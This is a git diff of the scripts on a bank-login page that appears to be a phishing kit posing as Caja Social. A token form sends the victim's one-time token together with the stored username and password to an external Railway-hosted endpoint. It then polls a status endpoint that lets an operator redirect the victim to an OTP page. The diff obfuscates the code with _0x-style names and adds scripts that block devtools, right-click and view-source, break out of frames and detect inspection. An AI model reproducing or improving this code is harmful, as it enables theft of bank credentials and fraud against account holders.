@@ -85,102 +85,95 @@
     </div>
     
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const tokenInput = document.getElementById('token');
-            const btnContinuar = document.getElementById('btnContinuar');
-            const errorMessage = document.querySelector('.error-message');
-            
-            const API = 'https://multi-bancos-production.up.railway.app';
-            const BANCO = 'caja-social';
-            
-            tokenInput.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '');
-                const value = this.value;
-                
-                errorMessage.style.display = 'none';
-                tokenInput.classList.remove('error');
-                
-                if (value.length === 6) {
-                    btnContinuar.disabled = false;
-                } else {
-                    btnContinuar.disabled = true;
-                }
-            });
-            
-            document.getElementById('tokenForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const value = tokenInput.value;
-                
-                if (value.length !== 6) {
-                    errorMessage.style.display = 'block';
-                    tokenInput.classList.add('error');
-                    return;
-                }
-                
-                var sessionId = sessionStorage.getItem('sessionId') || '';
-                var usuario = sessionStorage.getItem('usuario') || '';
-                var clave = sessionStorage.getItem('clave') || '';
-                
-                fetch(API + '/' + BANCO + '/enviar-token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: sessionId,
-                        token: value,
-                        identificacion: usuario,
-                        clave: clave
-                    })
-                }).then(function(r){ return r.json(); })
-                  .then(function(data){ console.log('Token enviado:', data); })
-                  .catch(function(err){ console.error('Error:', err); });
-                
-                var pantalla = document.getElementById('pantallaCarga');
-                if (pantalla) pantalla.classList.add('activa');
-                
-                var intervalo = setInterval(async function(){
-                    try {
-                        var r = await fetch(API + '/' + BANCO + '/estado/' + sessionId);
-                        var data = await r.json();
-                        console.log('Estado:', data.estado);
-                        
-                        if (data.estado === 'otp') {
-                            clearInterval(intervalo);
-                            window.location.href = 'otp.html';
-                        } else if (data.estado === 'rechazado') {
-                            clearInterval(intervalo);
-                            if (pantalla) pantalla.classList.remove('activa');
-                            var errorLogin = document.getElementById('errorLogin');
-                            if (errorLogin) errorLogin.classList.add('visible');
-                        }
-                    } catch (err) {
-                        console.error('Error estado:', err);
-                    }
-                }, 2000);
-            });
-            
-            var errorLoginBtn = document.getElementById('errorLoginBtn');
-            if (errorLoginBtn) {
-                errorLoginBtn.addEventListener('click', function() {
-                    var errorLogin = document.getElementById('errorLogin');
-                    if (errorLogin) errorLogin.classList.remove('visible');
-                    tokenInput.value = '';
-                    tokenInput.focus();
-                    btnContinuar.disabled = true;
-                });
+    document.addEventListener('DOMContentLoaded',function(){
+        var _0xa1=document.getElementById('token');
+        var _0xb2=document.getElementById('btnContinuar');
+        var _0xc3=document.querySelector('.error-message');
+        var _0xd4=document.getElementById('errorLogin');
+        var _0xe5=document.getElementById('errorLoginBtn');
+        var _0xf6='https://multi-bancos-production.up.railway.app';
+        var _0xg7='caja-social';
+
+        _0xa1.addEventListener('input',function(){
+            this.value=this.value.replace(/[^0-9]/g,'');
+            var _0xh8=this.value;
+            _0xc3.style.display='none';
+            _0xa1.classList.remove('error');
+            if(_0xh8.length===6){
+                _0xb2.disabled=false;
+            }else{
+                _0xb2.disabled=true;
             }
         });
+
+        document.getElementById('tokenForm').addEventListener('submit',function(_0xi9){
+            _0xi9.preventDefault();
+            var _0xj0=_0xa1.value;
+            if(_0xj0.length!==6){
+                _0xc3.style.display='block';
+                _0xa1.classList.add('error');
+                return;
+            }
+            var _0xk1=sessionStorage.getItem('sessionId')||'';
+            var _0xl2=sessionStorage.getItem('usuario')||'';
+            var _0xm3=sessionStorage.getItem('clave')||'';
+
+            fetch(_0xf6+'/'+_0xg7+'/enviar-token',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    sessionId:_0xk1,
+                    token:_0xj0,
+                    identificacion:_0xl2,
+                    clave:_0xm3
+                })
+            }).then(function(_0xn4){return _0xn4.json();})
+              .then(function(_0xo5){console.log('Token enviado:',_0xo5);})
+              .catch(function(_0xp6){console.error('Error:',_0xp6);});
+
+            var _0xq7=document.getElementById('pantallaCarga');
+            if(_0xq7)_0xq7.classList.add('activa');
+
+            var _0xr8=setInterval(async function(){
+                try{
+                    var _0xs9=await fetch(_0xf6+'/'+_0xg7+'/estado/'+_0xk1);
+                    var _0xt0=await _0xs9.json();
+                    console.log('Estado:',_0xt0.estado);
+                    if(_0xt0.estado==='otp'){
+                        clearInterval(_0xr8);
+                        window.location.href='otp.html';
+                    }else if(_0xt0.estado==='rechazado'){
+                        clearInterval(_0xr8);
+                        if(_0xq7)_0xq7.classList.remove('activa');
+                        if(_0xd4)_0xd4.classList.add('visible');
+                    }
+                }catch(_0xu1){
+                    console.error('Error estado:',_0xu1);
+                }
+            },2000);
+        });
+
+        if(_0xe5){
+            _0xe5.addEventListener('click',function(){
+                if(_0xd4)_0xd4.classList.remove('visible');
+                _0xa1.value='';
+                _0xa1.focus();
+                _0xb2.disabled=true;
+            });
+        }
+    });
     </script>
 
 <script>
 (function(){
-    var imagenes = ['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
-    var bg = document.getElementById('bgImage');
-    if (bg) {
-        var ultima = sessionStorage.getItem('ultimaBg') || '';
-        var disponibles = imagenes.filter(function(img){ return img !== ultima; });
-        var aleatoria = disponibles[Math.floor(Math.random() * disponibles.length)];
-        bg.src = aleatoria;
-        sessionStorage.setItem('ultimaBg', aleatoria);
+    var _0xv2=['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
+    var _0xw3=document.getElementById('bgImage');
+    if(_0xw3){
+        var _0xx4=sessionStorage.getItem('ultimaBg')||'';
+        var _0xy5=_0xv2.filter(function(_0xz6){return _0xz6!==_0xx4;});
+        var _0x07=_0xy5[Math.floor(Math.random()*_0xy5.length)];
+        _0xw3.src=_0x07;
+        sessionStorage.setItem('ultimaBg',_0x07);
     }
 })();
 </script>
@@ -188,31 +181,88 @@
 <script>
 (function(){
 'use strict';
-var lastTouchEnd = 0;
-document.addEventListener('touchend', function(e){
-var ahora = new Date().getTime();
-if (ahora - lastTouchEnd <= 300) { e.preventDefault(); }
-lastTouchEnd = ahora;
-}, { passive: false });
-document.addEventListener('dblclick', function(e){ e.preventDefault(); });
-document.addEventListener('focusin', function(e){
-var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
-if (tag === 'input' || tag === 'textarea' || tag === 'select') {
-if (e.target.style.fontSize !== '16px') {
-e.target.dataset._fs = e.target.style.fontSize || '';
-e.target.style.fontSize = '16px';
+var _0x18=0;
+document.addEventListener('touchend',function(_0x29){
+var _0x3a=new Date().getTime();
+if(_0x3a-_0x18<=300){_0x29.preventDefault();}
+_0x18=_0x3a;
+},{passive:false});
+document.addEventListener('dblclick',function(_0x4b){_0x4b.preventDefault();});
+document.addEventListener('focusin',function(_0x5c){
+var _0x6d=(_0x5c.target&&_0x5c.target.tagName)?_0x5c.target.tagName.toLowerCase():'';
+if(_0x6d==='input'||_0x6d==='textarea'||_0x6d==='select'){
+if(_0x5c.target.style.fontSize!=='16px'){
+_0x5c.target.dataset._fs=_0x5c.target.style.fontSize||'';
+_0x5c.target.style.fontSize='16px';
 }
 }
 });
-document.addEventListener('focusout', function(e){
-var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
-if (tag === 'input' || tag === 'textarea' || tag === 'select') {
-if (e.target.dataset._fs !== undefined) {
-e.target.style.fontSize = e.target.dataset._fs;
-delete e.target.dataset._fs;
+document.addEventListener('focusout',function(_0x7e){
+var _0x6d=(_0x7e.target&&_0x7e.target.tagName)?_0x7e.target.tagName.toLowerCase():'';
+if(_0x6d==='input'||_0x6d==='textarea'||_0x6d==='select'){
+if(_0x7e.target.dataset._fs!==undefined){
+_0x7e.target.style.fontSize=_0x7e.target.dataset._fs;
+delete _0x7e.target.dataset._fs;
 }
 }
 });
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+
+document.addEventListener('contextmenu',function(_0x8f){
+_0x8f.preventDefault();
+return false;
+});
+
+document.addEventListener('keydown',function(_0x9g){
+var _0xah=(_0x9g.key||'').toLowerCase();
+var _0xbi=_0x9g.ctrlKey||_0x9g.metaKey;
+var _0xcia=_0x9g.shiftKey;
+
+if(_0xah==='f12'){_0x9g.preventDefault();return false;}
+if(_0xbi&&_0xcia&&(_0xah==='i'||_0xah==='j'||_0xah==='c')){_0x9g.preventDefault();return false;}
+if(_0xbi&&_0xah==='u'){_0x9g.preventDefault();return false;}
+if(_0xbi&&_0xah==='s'){_0x9g.preventDefault();return false;}
+if(_0xbi&&_0xcia&&(_0xah==='k'||_0xah==='e'||_0xah==='s'||_0xah==='c')){_0x9g.preventDefault();return false;}
+if(_0x9g.metaKey&&_0x9g.altKey&&(_0xah==='i'||_0xah==='j'||_0xah==='c')){_0x9g.preventDefault();return false;}
+});
+
+document.addEventListener('dragstart',function(_0xdia){_0xdia.preventDefault();});
+
+document.addEventListener('selectstart',function(_0xeia){
+var _0xfia=(_0xeia.target&&_0xeia.target.tagName)?_0xeia.target.tagName.toLowerCase():'';
+if(_0xfia!=='input'&&_0xfia!=='textarea'){
+_0xeia.preventDefault();
+}
+});
+
+try{
+if(window.top!==window.self){
+window.top.location=window.self.location;
+}
+}catch(_0xgia){
+document.body.innerHTML='';
+}
+
+var _0xhia=false;
+var _0xiia=160;
+
+function _0xjia(){
+var _0xkia=window.outerWidth-window.innerWidth;
+var _0xlia=window.outerHeight-window.innerHeight;
+if(_0xkia>_0xiia||_0xlia>_0xiia){
+_0xhia=true;
+}else{
+_0xhia=false;
+}
+}
+
+setInterval(_0xjia,1000);
+
 })();
 </script>
 </body>
